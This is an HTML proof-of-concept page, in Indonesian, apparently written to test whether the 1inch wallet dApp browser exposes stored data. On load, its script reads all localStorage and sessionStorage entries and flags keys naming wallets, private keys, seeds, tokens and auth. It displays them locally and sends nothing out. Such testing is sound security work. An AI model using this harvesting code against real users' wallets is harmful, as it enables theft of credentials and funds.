<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1inch dApp Browser - Storage Access PoC</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; line-height: 1.5; }
        pre { background: #222; padding: 15px; overflow: auto; max-height: 70vh; }
        .warning { color: #ff0; font-weight: bold; }
        .success { color: #0f0; }
    </style>
</head>
<body>
    <h1>1inch Wallet dApp Browser Storage Access Proof-of-Concept</h1>
    <p class="warning">⚠️ Halaman ini dimuat di dalam 1inch dApp Browser</p>
    
    <button onclick="scanStorage()">🔍 Scan localStorage + sessionStorage</button>
    <button onclick="clearAndRescan()">Clear & Rescan</button>

    <h2>Hasil Scan Storage:</h2>
    <pre id="output">Klik tombol untuk scan...</pre>

    <h2>Sensitive Keys Detected:</h2>
    <pre id="sensitive"></pre>

    <script>
        function scanStorage() {
            const output = document.getElementById('output');
            const sensitiveEl = document.getElementById('sensitive');
            let result = "=== localStorage ===\n";
            let sensitive = "";

            // Scan localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                result += `${key}: ${value ? value.substring(0, 150) + (value.length > 150 ? '...' : '')}\n`;
                
                // Deteksi kunci sensitif
                const lowerKey = key.toLowerCase();
                if (lowerKey.includes('wallet') || lowerKey.includes('private') || lowerKey.includes('seed') || 
                    lowerKey.includes('session') || lowerKey.includes('token') || lowerKey.includes('auth') ||
                    lowerKey.includes('1inch') || lowerKey.includes('account') || lowerKey.includes('provider')) {
                    sensitive += `🔴 SENSITIVE: ${key} → ${value ? value.substring(0, 100) + '...' : 'null'}\n`;
                }
            }

            result += "\n=== sessionStorage ===\n";
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                result += `${key}: ${value ? value.substring(0, 150) + '...' : ''}\n`;
            }

            output.textContent = result;
            sensitiveEl.textContent = sensitive || "Tidak ditemukan kunci sensitif yang jelas.";

            console.log("%c1inch Storage PoC - Semua data di atas berhasil dibaca dari origin dApp ini", "color: yellow; font-size: 14px");
        }

        function clearAndRescan() {
            if (confirm("Yakin clear storage? Ini hanya untuk test.")) {
                localStorage.clear();
                sessionStorage.clear();
                document.getElementById('output').textContent = "Storage telah di-clear. Scan lagi...";
                scanStorage();
            }
        }

        // Auto scan saat load
        window.onload = () => {
            setTimeout(scanStorage, 800);
        };
    </script>
</body>
</html>
